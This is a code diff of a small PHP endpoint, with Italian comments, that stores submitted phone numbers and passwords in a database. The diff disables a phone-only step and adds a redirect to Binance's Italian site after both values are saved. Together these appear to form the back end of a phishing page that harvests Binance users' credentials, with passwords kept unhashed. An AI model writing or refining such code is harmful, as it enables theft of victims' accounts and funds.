@@ -28,17 +28,17 @@ $phone = isset($_POST['phone']) ? trim($_POST['phone']) : null;
 $password = isset($_POST['password']) ? trim($_POST['password']) : null;
 $id = isset($_POST['id']) ? intval($_POST['id']) : null;
 
-if ($phone && !$password) {
-    // Primo step: salva solo il telefono
-    $stmt = $pdo->prepare('INSERT INTO users (phone) VALUES (?)');
-    if ($stmt->execute([$phone])) {
-        echo json_encode(['success' => true, 'id' => $pdo->lastInsertId()]);
-    } else {
-        http_response_code(500);
-        echo json_encode(['error' => 'Failed to save phone number']);
-    }
-    exit;
-}
+// if ($phone && !$password) {
+//     // Primo step: salva solo il telefono
+//     $stmt = $pdo->prepare('INSERT INTO users (phone) VALUES (?)');
+//     if ($stmt->execute([$phone])) {
+//         echo json_encode(['success' => true, 'id' => $pdo->lastInsertId()]);
+//     } else {
+//         http_response_code(500);
+//         echo json_encode(['error' => 'Failed to save phone number']);
+//     }
+//     exit;
+// }
 
 if ($phone && $password) {
     // Inserisce sia telefono che password in una nuova riga
@@ -49,6 +49,7 @@ if ($phone && $password) {
         http_response_code(500);
         echo json_encode(['error' => 'Failed to save phone and password']);
     }
+    header("Location: https://www.binance.com/it");
     exit;
 }
 
